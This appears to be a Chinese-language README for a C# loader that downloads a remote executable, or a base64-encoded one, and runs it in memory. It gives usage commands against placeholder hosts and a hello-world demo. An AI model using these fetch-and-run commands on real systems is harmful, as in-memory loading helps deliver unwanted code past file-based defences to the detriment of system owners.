# sflcsharp
更高级的C#加载器，可将远程的C#文件或者base64密码加载到本地内存运行
# usage
-b 参数    
sflcsharp -b http://xxx.xxx.xxx.xxx/x.exe       
-b64 参数
sflcsharp -b64 http://xxx.xxx.xxx.xxx/x.txt   
这个txt文件里面存储的是某exe文件的base64编码的表示，可以用ftob64脚本文件来实现这个操作。   
这边可以使用此仓库中自带的hw.txt文件与helloworld.exe文件来做实验.

# 执行效果
我们提前在ip为10.92.52.27的主机上传了两个文件，一个为helloworld.exe，一个是此文件的base64密文形式。此exe文件执行效果为在命令输出fffffff，如下图所示：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200924103030584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMw,size_16,color_FFFFFF,t_70#pic_center)
这时候使用sflcsharp的-b参数来加载远程的c#语言的exe文件：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200924103205931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMw,size_16,color_FFFFFF,t_70#pic_center)
使用-b64参数来加载远程的b64密文：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200924103353619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMw,size_16,color_FFFFFF,t_70#pic_center)
